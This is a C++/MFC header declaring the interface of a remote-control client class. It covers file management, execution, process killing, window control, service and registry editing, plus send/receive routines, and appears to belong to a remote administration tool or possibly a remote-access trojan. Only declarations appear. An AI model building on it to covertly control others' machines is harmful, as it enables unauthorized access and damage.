// MyAdminTrans.h: interface for the CMyMainTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYADMINTRANS_H__ECE7B620_3A9F_4CED_AD93_095637A47CD1__INCLUDED_)
#define AFX_MYADMINTRANS_H__ECE7B620_3A9F_4CED_AD93_095637A47CD1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

BOOL CALLBACK EnumExplorerWindowsProc(HWND hwnd, LPARAM lParam);

class CMyMainTrans : public CMyClientTran
{
public:
	BOOL StartWork(HWND hWnd);
	CMyMainTrans();
	virtual ~CMyMainTrans();

private:

	DWORD	m_Command;	
	DWORD	m_dTransLen;
	BYTE*	m_TransData;
	TCHAR	m_TmpFilePath[MAX_PATH];

	//文件
	void GetDirList();
	void GetFileInfo();
	void GetDirInfo();
	void GetDiskInfo();
	void DeleteMyFile();
	void CreateDir();
	void ReNameFile();
	void GetDiskList();
	void ExecFile();
	void GetFindFileList();
	void GetDownFileList();
	void SaveCopyListInfo(HANDLE hFile, LPCTSTR pFilePath);
	void SaveDirListInfo(HANDLE hFile, LPCTSTR pFilePath);
	BOOL FindFile(LPCTSTR m_ParentPath, LPCTSTR FileName, HANDLE hFile);
	BOOL FindDir(LPCTSTR m_ParentPath,int & DirCount,int & FileCount,ULONGLONG & AllFileSize);
	BOOL FindCopyFile(LPCTSTR m_ParentPath, HANDLE hFile);
	BOOL WINAPI FileOpertion(LPCTSTR szFileName1,LPCTSTR szFileName2,DWORD opt);

	//进程
	void GetProcessList();
	void KillOneProcess();

	//窗口
	void MyEnumWindows();
	void MyContrlWindows();
	static BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam);

	//服务
	void EnumMyServices();
	void ControlMyServices();
	void ConfigMyServices();
	void DeleteMyServices();
	void GetServicesConfig(SC_HANDLE hMana,LPMYSERVICES pServices);

	//注册表
	void MyRegDeleteKey();
	void MyRegDeleteValue();
	void MyRegEditValue();
	void MyRegEnumKey();

	//公共
	void FillDiskInfo(LPCTSTR pDiskName, DISKINFO& m_DiskInfo);
	BOOL SendBag();
	BOOL ReadBag();
	HANDLE OpenMyTmpFile();
	void SaveDataToTmpFile();
public:
	
};

#endif // !defined(AFX_MYADMINTRANS_H__ECE7B620_3A9F_4CED_AD93_095637A47CD1__INCLUDED_)
